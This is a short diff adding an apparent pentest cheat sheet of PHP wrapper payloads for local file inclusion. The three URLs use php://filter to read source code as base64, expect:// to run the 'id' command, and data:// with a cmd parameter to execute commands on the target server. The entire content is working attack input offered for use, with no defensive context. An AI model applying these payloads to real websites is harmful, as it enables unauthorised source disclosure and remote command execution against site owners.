@@ -1,0 +1,4 @@
+WRAPPERS
+http://ip/index.php?page=php://filter/convert.base64-encode/resource=file
+http://ip/index.php?page=expect://id
+http://example.com/index.php?page=data://text/plain;base64,value=&cmd=command
